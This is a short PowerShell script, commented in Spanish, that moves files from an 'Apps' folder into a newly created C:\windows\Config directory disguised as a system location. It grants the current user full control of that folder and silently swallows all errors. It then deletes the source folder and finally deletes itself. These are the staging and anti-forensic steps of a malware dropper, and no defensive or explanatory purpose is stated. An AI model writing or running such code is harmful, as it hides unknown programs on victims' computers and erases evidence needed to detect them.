$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$origenApps = Join-Path $scriptDir "Apps"
$carpetaDestino = "C:\windows\Config"
$scriptPath = $MyInvocation.MyCommand.Path

try {
    if (!(Test-Path $carpetaDestino)) {
        New-Item -Path $carpetaDestino -ItemType Directory -Force | Out-Null
    }

    $usuario = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $acl = Get-Acl $carpetaDestino
    $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($usuario, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $acl.SetAccessRule($accessRule)
    Set-Acl -Path $carpetaDestino -AclObject $acl

    if (Test-Path $origenApps) {
        Get-ChildItem -Path $origenApps -File | ForEach-Object {
            Move-Item -Path $_.FullName -Destination $carpetaDestino -Force -ErrorAction SilentlyContinue
        }
        
        # Borrar la carpeta Apps despu�s de mover todos los archivos
        Remove-Item -Path $origenApps -Recurse -Force -ErrorAction SilentlyContinue
    }
} catch {
    # Silencioso - no mostrar errores
}

# Autodestrucci�n del archivo PS1
Start-Sleep -Seconds 2
Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue